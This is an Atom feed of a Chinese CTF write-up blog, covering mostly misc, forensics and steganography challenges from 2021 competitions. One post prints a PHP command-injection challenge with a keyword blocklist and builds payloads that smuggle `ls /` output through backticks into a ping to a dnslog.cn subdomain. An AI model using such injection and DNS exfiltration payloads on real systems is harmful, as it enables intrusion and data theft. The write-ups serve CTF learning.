<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>The blog of mklkx</title>
  <icon>https://www.gravatar.com/avatar/6304657417bd40e9a3c6f5c53a19ef73</icon>
  
  <link href="http://mklkx.github.io/atom.xml" rel="self"/>
  
  <link href="http://mklkx.github.io/"/>
  <updated>2021-06-06T13:01:51.084Z</updated>
  <id>http://mklkx.github.io/</id>
  
  <author>
    <name>煤矿路口西</name>
    <email>mklkx_yep@163.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>美团CTF初+决</title>
    <link href="http://mklkx.github.io/2021/06/06/%E7%BE%8E%E5%9B%A2CTF%E5%88%9D-%E5%86%B3/"/>
    <id>http://mklkx.github.io/2021/06/06/%E7%BE%8E%E5%9B%A2CTF%E5%88%9D-%E5%86%B3/</id>
    <published>2021-06-06T12:48:00.000Z</published>
    <updated>2021-06-06T13:01:51.084Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="美团ctf初决">美团CTF初+决</span></h3><p>团队第九</p><hr><h4><span id="different_puzzle">Different_Puzzle</span></h4><p>得到null.vhd</p><p>用360压缩打开</p><p>直接拖出来</p><p>得到69张图片，1个flag.exe</p><p>后缀名vhd，用取证大师打开</p><p>根据</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p><a class="link" href="https://github.com/jschicht/UsnJrnl2Csv">https://github.com/jschicht/UsnJrnl2Csv<i class="fas fa-external-link-alt"></i></a></p><p>找到日志，</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>得到对应的png</p><p>通过PS拼接得到</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>扫描条形码得到【EuO9&amp;cDH】</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p>注：此处有个大坑，若用一向以精确度闻名的支付宝扫码的话，会出现只能识别一半的情况，反倒是QQ能得到准确的内容【EuO9&amp;cDH】</p><p>运行flag.exe得到flag</p><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><p><strong>flag{af26d693-2de2-4b16-be49-d95e83a43f76}</strong></p><h4><span id="misc_cp">MISC_CP</span></h4><p>预览图看到蓝色部分的二维码</p><p>foremost后</p><p><img lazyload src="/images/loading.svg" data-src="6.png" alt="6"></p><p>扫描得到</p><p><img lazyload src="/images/loading.svg" data-src="7.png" alt="7"></p><p>11-8437-f2c73bf76c16}</p><p>另一半flag为lsb隐写</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar Stegsolove.jar</span><br></pre></td></tr></table></figure><p>在Blue plane 6时得到汉信码</p><p><img lazyload src="/images/loading.svg" data-src="8.png" alt="8"></p><p>中国编码APP</p><p><img lazyload src="/images/loading.svg" data-src="9.jpg" alt="9"></p><p>flag{d4dce746-7f13-47</p><p><strong>flag值：flag{d4dce746-7f13-4711-8437-f2c73bf76c16}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;美团ctf初决&quot;&gt;美团CTF初+决&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;团队第九&lt;/p&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;different_puzzle&quot;&gt;Different_Puzzle&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;得到null.vhd&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
  </entry>
  
  <entry>
    <title>DNSlog盲注</title>
    <link href="http://mklkx.github.io/2021/05/22/DNSlog%E7%9B%B2%E6%B3%A8/"/>
    <id>http://mklkx.github.io/2021/05/22/DNSlog%E7%9B%B2%E6%B3%A8/</id>
    <published>2021-05-22T08:17:46.000Z</published>
    <updated>2021-05-22T13:09:11.835Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="dnslog盲注"><em>DNSlog盲注</em></span></h1><h2><span id="题目源码如下">题目源码如下：</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&quot;Ginkgo&quot;]))&#123;</span><br><span class="line">    $c &#x3D; $_GET[&quot;Ginkgo&quot;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;flag|wget|sleep|socket|sock|perl|ruby|curl|php&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        shell_exec(&quot;ping -c 3 &quot;.$c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2><span id="分析">分析：</span></h2><p>传入变量Ginkgo</p><p>赋值给变量c</p><p>判断变量c是否等于&quot;/flag|wget|sleep|socket|sock|perl|ruby|curl|php/i&quot;</p><p>若不一致则执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 $c</span><br></pre></td></tr></table></figure><p>简单学习了一下http://blog.merl1ng.cc/2018/03/02/dnslog%E5%88%A9%E7%94%A8/</p><p>在pdsdt师傅的指导下</p><p>简单捋了下最终需构造的命令如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 &#96;ls &#x2F;|base64|head -n 1|cut -c 0-80&#96;.DNSLog.cn</span><br></pre></td></tr></table></figure><h3><span id="1">1）</span></h3><p>为解决无法回显的问题，需要一个介质来接收返回的信息，</p><p>DNSLog.cn中Get SubDomain,</p><p>得到一个dnslog的子域名</p><p>在自身服务器中执行命令后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 6t775q.dnslog.cn</span><br></pre></td></tr></table></figure><p>能在DNSLog的Refresh Record中看到自身的ip</p><p>这意味着咱们已经能够利用这种方式得到回显</p><h3><span id="2">2）</span></h3><p>进一步构造</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 &#96;ls &#x2F;&#96;.bet8m1.dnslog.cn</span><br></pre></td></tr></table></figure><p>空格问题需要绕过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 &#96;ls &#x2F;|base64&#96;.bet8m1.dnslog.cn</span><br></pre></td></tr></table></figure><p>但直接dump出来出现乱码</p><p>问题在于按行显示的格式问题</p><h3><span id="3">3）</span></h3><p><a class="link" href="https://www.runoob.com/linux/linux-comm-head.html?ivk_sa=1024320u">https://www.runoob.com/linux/linux-comm-head.html?ivk_sa=1024320u<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="https://www.runoob.com/linux/linux-comm-cut.html">https://www.runoob.com/linux/linux-comm-cut.html<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 &#96;ls &#x2F;|base64|head -n 1|cut -c 40-80&#96;.bet8m1.dnslog.cn</span><br></pre></td></tr></table></figure><p>截取第一行第40到80个字符，</p><p>注意字符的重复和替代情况</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;dnslog盲注&quot;&gt;&lt;em&gt;DNSlog盲注&lt;/em&gt;&lt;/span&gt;&lt;/h1&gt;
&lt;h2&gt;&lt;span id=&quot;题目源码如下&quot;&gt;题目源码如下：&lt;/span&gt;&lt;/h2&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://mklkx.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>2021CISCN</title>
    <link href="http://mklkx.github.io/2021/05/18/2021CISCN/"/>
    <id>http://mklkx.github.io/2021/05/18/2021CISCN/</id>
    <published>2021-05-18T02:06:21.000Z</published>
    <updated>2021-05-18T02:28:06.588Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="2021ciscn-misc">2021CISCN-Misc</span></h1><hr><h2><span id="tiny-traffic">tiny traffic</span></h2><p>流量包导出http对象得到一堆文件</p><p>其中【test】和【secret】似乎有点东西</p><p>但直接打开为乱码</p><p>考虑br解码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import brotli</span><br><span class="line">f &#x3D; open(&#39;secret&#39;,&#39;rb&#39;).read()</span><br><span class="line">print(f)</span><br><span class="line">c &#x3D; brotli.decompress(f)</span><br><span class="line">print(c)</span><br><span class="line">#b&#39;\x08\xc8\x01\x10\xa2\xd4\x99\x07\x1a\x0e\n\x05e2345\x12\x057af2c\x1a\x0f\n\x067889b0\x12\x0582bc0 \xc6\xa2\xec\x07*\td172a38dc&#39;</span><br></pre></td></tr></table></figure><p>以上是解码后的【secret】内容，猜测为flag</p><p>【test】</p><p><img lazyload src="/images/loading.svg" data-src="ciscn1.png" alt="1"></p><p>根据内容搜索得到https://blog.csdn.net/u013210620/article/details/81317731</p><p>安装好后，将test后缀改为.proto</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protoc test.proto  --python_out&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><p>解决报错https://blog.csdn.net/qq_27563511/article/details/80696403</p><p><img lazyload src="/images/loading.svg" data-src="ciscn2.png" alt="2"></p><p>得到test_pb2.py</p><p>编写代码，</p><p>调用这个库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import test_pb2</span><br><span class="line"></span><br><span class="line">flag_pb &#x3D; test_pb2.PBResponse()</span><br><span class="line">flag_pb.ParseFromString(b&#39;\x08\xc8\x01\x10\xa2\xd4\x99\x07\x1a\x0e\n\x05e2345\x12\x057af2c\x1a\x0f\n\x067889b0\x12\x0582bc0 \xc6\xa2\xec\x07*\td172a38dc&#39;)</span><br><span class="line">print(flag_pb)</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="ciscn3.png" alt="3"></p><p>按要求拼接得到</p><p><strong>CISCN{e66a22e23457889b0fb1146d172a38dc}</strong></p><h2><span id="running_pixel">running_pixel</span></h2><p>gif动图分离得到382张png</p><p>观察得它们中存在统一RGB值为(233,233,233)的色块</p><p>提取出他们的坐标值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line">from PIL import Image</span><br><span class="line">for k in range(0,382):#张数</span><br><span class="line">    im &#x3D; Image.open(&#39;Frame%d.png&#39;%k)</span><br><span class="line">    # print(im.size[0])</span><br><span class="line">    # print(im.size[1])</span><br><span class="line">    for i in range(0,400):</span><br><span class="line">        for j in range(0,400):</span><br><span class="line">            #print(&#39;Frame%d.png&#39;%k)</span><br><span class="line">            # print(im.getpixel((i, j)))</span><br><span class="line">            if(im.getpixel((i, j))&#x3D;&#x3D;(233, 233, 233, 255)):</span><br><span class="line">                # print(&#39;Frame%d.png&#39;%k)</span><br><span class="line">                print(i,j)</span><br><span class="line">                #print(im.getpixel((i,j)))</span><br><span class="line">                break</span><br></pre></td></tr></table></figure><p>保存到xy.txt中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">img&#x3D;Image.new(&#39;RGB&#39;,(400,400))</span><br><span class="line">file &#x3D; open(&quot;xy.txt&quot;, &quot;r&quot;)</span><br><span class="line">text &#x3D; file.readlines()[0]</span><br><span class="line">ch &#x3D; text.split(&quot; &quot;)</span><br><span class="line">print(ch)</span><br><span class="line">x &#x3D; []</span><br><span class="line">y &#x3D; []</span><br><span class="line">for i in ch:</span><br><span class="line">   x.append(i.split(&#39;,&#39;)[0])</span><br><span class="line">   y.append(i.split(&#39;,&#39;)[1])</span><br><span class="line">#print(x)</span><br><span class="line">print(len(x))</span><br><span class="line">for k in range(len(x)):</span><br><span class="line">   print(k)</span><br><span class="line">   img.putpixel((int(y[k]),int(x[k])),(233,233,233))</span><br><span class="line">   img.save(&quot;test%d.png&quot;%k)</span><br></pre></td></tr></table></figure><p>读取坐标值数据并写在对应位置上</p><p><img lazyload src="/images/loading.svg" data-src="ciscn4.png" alt="4"></p><p>flag的顺序为数字依次出现的数据</p><p><strong>CISCN{12504d0f-9de1-4b00-87a5-a5fdd0986a00}</strong></p><h2><span id="隔空传话">隔空传话</span></h2><p>pdu编码</p><p>首先进行数据清洗</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">b &#x3D; []</span><br><span class="line">d &#x3D; []</span><br><span class="line">e &#x3D; []</span><br><span class="line">a &#x3D; open(&#39;data.txt&#39;)</span><br><span class="line">for i in a:</span><br><span class="line">    b.append(i[34:46])</span><br><span class="line"># print(b)</span><br><span class="line"></span><br><span class="line">for i in b:</span><br><span class="line">    # print(i)</span><br><span class="line">    # c &#x3D; i[::2]</span><br><span class="line">    # print(c)</span><br><span class="line">    c&#x3D;&quot;&quot;</span><br><span class="line">    text_list &#x3D; re.findall(&quot;.&#123;2&#125;&quot;, i)</span><br><span class="line">    for j in text_list:</span><br><span class="line">        c+&#x3D;j[::-1]</span><br><span class="line">    d.append(c)</span><br><span class="line">d &#x3D; sorted(d)</span><br><span class="line"># print(d)</span><br><span class="line">#  此时d为已经排序好的顺序</span><br><span class="line">for i in d:</span><br><span class="line">    text_list &#x3D; re.findall(&quot;.&#123;2&#125;&quot;, i)</span><br><span class="line">    c&#x3D;&quot;&quot;</span><br><span class="line">    for j in text_list:</span><br><span class="line">        c+&#x3D;j[::-1]</span><br><span class="line">    e.append(c)</span><br><span class="line"># print(e)</span><br><span class="line">file_handle&#x3D;open(&#39;dnm.txt&#39;,mode&#x3D;&#39;w&#39;)</span><br><span class="line">for i in range(616):</span><br><span class="line">    woc &#x3D; 0</span><br><span class="line">    c &#x3D; (&quot;调转前:&#123;&#125; |调转后: &#123;&#125; \n&quot;.format(d[woc],e[woc]))</span><br><span class="line">    file_handle.write(c)</span><br><span class="line">    woc+&#x3D;1</span><br><span class="line"># e &#x3D; sorted(e)</span><br><span class="line">#</span><br><span class="line"># for i in d:</span><br><span class="line">#     file_handle.write(&quot;&#123;&#125;\n &quot;.format(i))</span><br><span class="line">#     print(i)</span><br><span class="line"># file2 &#x3D; open(&#39;dnm.txt&#39;)</span><br><span class="line">#</span><br><span class="line"># step &#x3D; 0 #计数器</span><br><span class="line"># for i in file2:</span><br><span class="line">#     print(&quot;调转后:&#123;&#125;  调转前:&#123;&#125;&quot;.format(i,e[step]))</span><br><span class="line">#     step +&#x3D; 1</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="ciscn5.png" alt="5"></p><p>得到类似210425194359的，按照年月日时分秒排列的数据</p><p>经过手动匹配后，pdu解码</p><p><a class="link" href="http://www.sendsms.cn/pdu/">http://www.sendsms.cn/pdu/<i class="fas fa-external-link-alt"></i></a></p><p>补充前后关键数据如下：</p><p><img lazyload src="/images/loading.svg" data-src="ciscn6.png" alt="6"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">the first part of the flag is the first 8 digits of your phone number </span><br><span class="line">那其他部分呢 </span><br><span class="line">看看你能从这些数据里发现什么？w465</span><br></pre></td></tr></table></figure><p>拼合数据得到png</p><p><img lazyload src="/images/loading.svg" data-src="ciscn7.png" alt="7"></p><p>贴进010后</p><p>png根据crc32爆破长宽</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import os</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">misc &#x3D; open(&quot;Untitled1.png&quot;, &quot;rb&quot;).read()</span><br><span class="line"># 爆破宽</span><br><span class="line">for i in range(1024):</span><br><span class="line">    data &#x3D; misc[12:16] + struct.pack(&#39;&gt;i&#39;, i) + misc[20:29]  # IHDR数据</span><br><span class="line">    crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 &#x3D;&#x3D; 0xBFFAF2DD:  # IHDR块的crc32值</span><br><span class="line">        print(&#39;weight&#39;)</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;hex:&quot; + hex(i))</span><br><span class="line"># 爆破高</span><br><span class="line">for i in range(1024):</span><br><span class="line">    data &#x3D; misc[12:20] + struct.pack(&#39;&gt;i&#39;, i) + misc[24:29]</span><br><span class="line">    crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 &#x3D;&#x3D; 0xBFFAF2DD:</span><br><span class="line">        print(&#39;height&#39;)</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;hex:&quot; + hex(i))</span><br><span class="line"># weight</span><br><span class="line"># 465</span><br><span class="line"># hex:0x1d1</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="ciscn8.png" alt="8"></p><p><strong>CISCN{15030442_b586_4c9e_b436_26def12293e4}</strong></p><h2><span id="robot">robot</span></h2><p>给了一个pcapng流</p><p>通过追踪tcp流</p><p>发现【Value.[36,35,0]】字样</p><p>疑似坐标</p><p>通过数据清洗</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">with open(&#39;.&#x2F;tcp.txt&#39;,&#39;r&#39;,encoding&#x3D;&quot;utf-8&quot;) as f:</span><br><span class="line">    text &#x3D; f.read()</span><br><span class="line">    p1 &#x3D; re.compile(r&#39;Value\.\[\d+,\d+,-?\d+\.*\d*\]&#39;)</span><br><span class="line">    data &#x3D; (re.findall(p1, text))</span><br><span class="line"></span><br><span class="line">    with open(&#39;data.txt&#39;,&#39;w&#39;,encoding&#x3D;&quot;utf-8&quot;) as l:</span><br><span class="line">        l.write(str(data))</span><br></pre></td></tr></table></figure><p>得到</p><p><img lazyload src="/images/loading.svg" data-src="ciscn9.png" alt="9"></p><p>经过处理，参考前卷代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">img&#x3D;Image.new(&#39;RGB&#39;,(400,400))</span><br><span class="line">mark&#x3D;[(27,36),(28,35),(29,35),(31,35),(32,35),(33,35),(35,35),(36,35),(37,35),(39,34),(40,34),(41,33),(42,32),(43,32),(45,32),(47,31),(48,29),(49,28),(49,27),(50,26),(50,25),(51,23),(51,22),(51,21),(52,20),(52,19),(52,18),(52,17),(52,16),(52,15),(51,14),(50,14),(49,14),(48,14),(47,14),(46,14),(45,14),(44,14),(43,14),(42,14),(40,14),(39,14),(37,14),(35,14),(34,14),(32,14),(30,14),(28,14),(27,14),(26,14),(25,14),(24,14),(23,14),(22,14),(21,15),(20,16),(19,17),(18,19),(18,21),(18,22),(18,23),(18,24),(18,26),(18,27),(18,28),(18,30),(18,32),(18,33),(18,34),(19,37),(21,39),(21,40),(22,42),(24,44),(24,45),(26,47),(27,48),(28,49),(29,50),(30,51),(31,52),(33,53),(34,53),(35,54),(36,54),(37,54),(38,54),(39,54),(40,54),(41,54),(44,54),(46,54),(48,54),(50,54),(52,53),(53,53),(54,52),(55,52),(56,52),(58,51),(59,50),(61,49),(62,49),(64,47),(65,47),(67,46),(68,46),(70,45),(71,44),(71,44,-10),(125,23),(125,23),(124,22),(123,22),(121,21),(118,20),(115,19),(113,19),(112,18),(111,18),(109,17),(106,16),(104,16),(103,16),(102,15),(101,15),(100,15),(99,15),(98,15),(97,15),(96,15),(95,15),(94,15),(93,15),(92,15),(91,15),(89,15),(87,17),(85,18),(85,19),(84,21),(83,21),(82,22),(82,23),(81,24),(81,26),(80,28),(80,29),(80,31),(80,32),(79,34),(79,35),(79,37),(79,39),(79,41),(79,43),(79,44),(79,46),(79,47),(80,48),(81,49),(82,50),(84,50),(87,51),(88,51),(90,51),(91,51),(93,51),(94,51),(97,51),(100,50),(101,49),(102,49),(103,48),(105,46),(106,45),(108,43),(109,42),(110,41),(111,39),(112,38),(112,36),(113,34),(114,33),(115,32),(115,31),(116,30),(117,28),(118,27),(118,28),(117,30),(116,32),(115,34),(115,36),(114,39),(114,41),(114,43),(114,45),(114,47),(114,48),(114,50),(114,52),(114,53),(115,54),(116,55),(117,56),(118,57),(120,57),(122,57),(124,57),(126,57),(128,57),(131,57),(133,57),(136,57),(138,57),(141,57),(143,56),(145,55),(147,53),(149,52),(150,52),(152,50),(153,49),(155,47),(156,46),(157,45),(157,45,-10),(212,24),(212,24),(213,23),(211,21),(210,20),(209,19),(208,18),(207,17),(206,16),(205,15),(204,15),(201,14),(200,14),(199,14),(197,14),(196,14),(195,14),(193,14),(191,14),(189,16),(188,16),(187,16),(186,17),(185,17),(183,18),(183,20),(183,21),(182,22),(182,23),(182,24),(182,25),(182,26),(182,27),(182,29),(183,31),(184,32),(186,33),(187,34),(188,34),(189,35),(190,35),(192,36),(194,37),(196,37),(198,38),(199,38),(200,38),(201,38),(202,39),(203,39),(204,40),(207,41),(207,42),(208,43),(208,44),(208,45),(208,46),(208,48),(208,50),(208,51),(207,53),(207,54),(206,56),(204,58),(203,60),(202,61),(201,62),(201,63),(200,64),(199,64),(198,64),(197,65),(196,65),(195,65),(193,65),(192,65),(190,65),(189,65),(187,65),(185,65),(184,65),(183,65),(181,64),(180,63),(179,63),(178,62),(177,62),(175,61),(174,60),(173,59),(173,59,-10),(243,20),(243,20),(244,19),(244,21),(244,25),(245,26),(245,29),(247,32),(247,34),(248,36),(248,37),(249,39),(250,40),(251,42),(251,43),(252,44),(254,44),(256,44),(258,44),(260,42),(262,41),(263,40),(265,38),(266,35),(267,32),(268,30),(271,27),(272,25),(273,22),(274,21),(275,20),(275,19),(274,18),(274,20),(272,22),(271,23),(271,26),(268,29),(266,33),(266,35),(265,37),(263,40),(262,42),(262,44),(261,47),(260,49),(259,51),(258,55),(258,56),(257,58),(255,61),(254,62),(253,63),(253,64),(252,65),(251,66),(250,67),(249,68),(248,69),(247,70),(246,71),(245,72),(244,73),(244,73,-10),(298,64),(298,64),(299,65),(300,65),(302,65),(304,65),(306,65),(308,65),(309,65),(312,65),(315,65),(317,65),(319,65),(322,65),(325,65),(327,65),(330,65),(332,65),(334,66),(335,66),(335,66,-10),(20,103),(20,104),(20,107),(20,110),(20,112),(20,114),(20,118),(19,121),(18,124),(17,126),(17,130),(17,134),(17,137),(17,139),(17,142),(17,143),(17,146),(17,147),(17,149),(17,150),(17,149),(17,148),(17,146),(18,145),(18,143),(19,142),(20,141),(20,140),(21,138),(21,137),(22,135),(23,134),(24,132),(25,131),(26,129),(27,128),(28,127),(29,126),(31,125),(32,124),(32,123),(34,121),(35,120),(37,120),(38,119),(40,118),(41,118),(43,117),(44,116),(46,115),(48,115),(49,114),(50,113),(51,113),(52,112),(52,112,-10),(80,121),(80,121),(79,120),(78,121),(77,122),(77,123),(77,124),(76,127),(75,128),(74,129),(73,131),(73,132),(73,133),(72,135),(72,136),(72,137),(72,138),(72,139),(72,140),(72,142),(72,144),(72,145),(73,148),(74,149),(77,150),(78,150),(80,151),(81,151),(82,151),(83,151),(84,151),(85,151),(87,151),(89,151),(90,151),(92,150),(93,150),(95,149),(97,147),(98,146),(99,146),(100,145),(101,144),(102,142),(102,141),(104,139),(104,138),(105,136),(105,135),(105,133),(105,132),(105,131),(105,129),(104,128),(103,126),(102,126),(101,125),(98,123),(96,123),(95,123),(93,123),(92,122),(90,121),(89,121),(86,120),(86,120,-10),(147,98),(147,98),(146,99),(145,100),(144,103),(143,104),(142,105),(142,106),(142,109),(142,111),(142,114),(141,118),(140,120),(139,123),(138,127),(138,129),(137,133),(135,135),(134,137),(133,139),(131,142),(131,143),(131,145),(130,146),(129,149),(128,152),(128,153),(127,156),(127,157),(126,158),(127,157),(129,157),(130,156),(132,156),(134,155),(137,153),(138,152),(139,151),(140,150),(143,149),(144,148),(145,147),(146,146),(147,145),(149,144),(149,143),(150,142),(151,141),(152,140),(152,139),(153,138),(153,137),(153,136),(153,135),(153,134),(153,133),(152,132),(151,131),(150,131),(149,130),(147,129),(147,129,-10),(186,136),(186,136),(183,137),(182,138),(182,139),(182,140),(181,142),(179,144),(179,145),(179,147),(178,149),(177,150),(177,151),(177,152),(177,154),(177,156),(177,157),(177,158),(178,160),(179,161),(180,162),(181,163),(182,164),(184,164),(186,164),(187,164),(188,164),(190,163),(191,162),(192,162),(194,160),(196,159),(197,158),(197,156),(198,155),(200,153),(200,152),(201,150),(201,149),(201,148),(201,147),(201,145),(201,144),(201,142),(201,141),(201,139),(201,138),(200,136),(199,135),(198,135),(197,135),(196,135),(195,135),(193,135),(192,135),(190,135),(189,135),(189,135,-10),(223,167),(223,167),(224,167),(226,167),(228,167),(229,167),(232,167),(233,167),(234,167),(235,167),(237,167),(238,167),(240,167),(241,167),(243,167),(244,167),(246,167),(247,167),(250,168),(251,168),(252,168),(253,168),(254,168),(254,168,-10),(269,135),(271,136),(273,138),(275,140),(276,141),(278,143),(280,145),(282,147),(284,149),(285,150),(288,152),(289,153),(291,154),(293,156),(294,157),(296,159),(297,160),(298,161),(299,162),(299,162,-10),(300,136),(299,136),(297,137),(296,138),(294,141),(294,142),(293,144),(293,145),(292,148),(291,149),(290,151),(288,153),(288,155),(287,156),(286,157),(285,159),(284,160),(283,161),(282,162),(281,163),(280,164),(279,165),(279,165,-10),(327,142),(328,143),(330,145),(332,148),(333,149),(335,151),(337,154),(339,156),(341,158),(342,159),(345,160),(347,161),(348,162),(350,164),(351,165),(352,166),(355,168),(356,169),(356,169,-10),(351,143),(350,143),(348,144),(347,144),(346,145),(343,148),(341,150),(339,152),(336,155),(333,158),(330,159),(327,162),(325,165),(323,167),(322,168),(319,170),(317,171),(316,171),(314,172),(313,172),(313,172)]</span><br><span class="line">print(mark[0])</span><br><span class="line">for j in range(len(mark)):</span><br><span class="line">    for i in range(len(mark)):</span><br><span class="line">        img.putpixel((list(mark[i])[0], list(mark[i])[1]), (255, 255, 255))</span><br><span class="line">img.save(&#39;flag.png&#39;)</span><br></pre></td></tr></table></figure><p>得到</p><p><img lazyload src="/images/loading.svg" data-src="ciscn10.png" alt="10"></p><p>md5加密</p><p><strong>CISCN{d4f1fb80bc11ffd722861367747c0f10}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;2021ciscn-misc&quot;&gt;2021CISCN-Misc&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;tiny-traffic&quot;&gt;tiny traffic&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;流量包导出http对象得到一堆文件&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021红帽杯</title>
    <link href="http://mklkx.github.io/2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AF/"/>
    <id>http://mklkx.github.io/2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AF/</id>
    <published>2021-05-11T06:31:40.000Z</published>
    <updated>2021-05-11T06:35:05.293Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021红帽杯">2021红帽杯</span></h3><hr><h4><span id="签到">签到</span></h4><p>根据文件名提示，</p><p>把txt拖进010editor，</p><p>更改编码方式为【EBCDIC】</p><p>flag{we1c0me_t0_redhat2021}</p><h4><span id="colorful-code">colorful code</span></h4><p>附件得到两个data</p><p>一个全是数字，一个是十六进制</p><p>结合题目【colorful】</p><p>猜测为图片隐写</p><p>1）如何形成图片data2开头为【000000】</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>猜测为RGB，相当于字典</p><p>而data1为索引值，数字对应data2中的第几组数据。</p><p>接下来是长宽的问题</p><p>尝试了很多方式，</p><p>发现data1的长度为7068，微调后发现【7067=37*191】</p><p>脚本如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">im &#x3D; open(&quot;data1&quot;,&quot;r&quot;)</span><br><span class="line">mark &#x3D; im.readline().split(&#39; &#39;)</span><br><span class="line">print(mark)</span><br><span class="line">print(len(mark))</span><br><span class="line">c &#x3D; [(0,0,0),(0,0,192),(0,255,255),(0,255,0),(255,192,255),(255,192,192),(192,192,255),(192,192,0),(255,0,255),(255,0,0),(192,0,0),(192,0,192),(255,255,255),(255,255,0),(255,255,192),(0,192,0),(0,192,192),(192,255,255),(192,255,192),(0,0,255)]</span><br><span class="line">pic &#x3D; Image.new(&quot;RGB&quot;,(37,191))</span><br><span class="line">k&#x3D;0</span><br><span class="line">for i in range(37):</span><br><span class="line">    for j in range(191):</span><br><span class="line">        pic.putpixel((int(i),int(j)),c[int(mark[k])])</span><br><span class="line">        k +&#x3D; 1</span><br><span class="line">pic.save(&#39;flag.png&#39;)</span><br></pre></td></tr></table></figure><p>得到png</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>找到解密网站https://www.bertnase.de/npiet/npiet-execute.php</p><p>得到flag</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">88842f20-fb8c-45c9-ae8f-36135b6a0f11</span><br></pre></td></tr></table></figure><p>加flag头上交</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021红帽杯&quot;&gt;2021红帽杯&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;签到&quot;&gt;签到&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;根据文件名提示，&lt;/p&gt;
&lt;p&gt;把txt拖进010editor，&lt;/p&gt;
&lt;p&gt;更改编码方式为【EBCDIC】&lt;</summary>
      
    
    
    
    
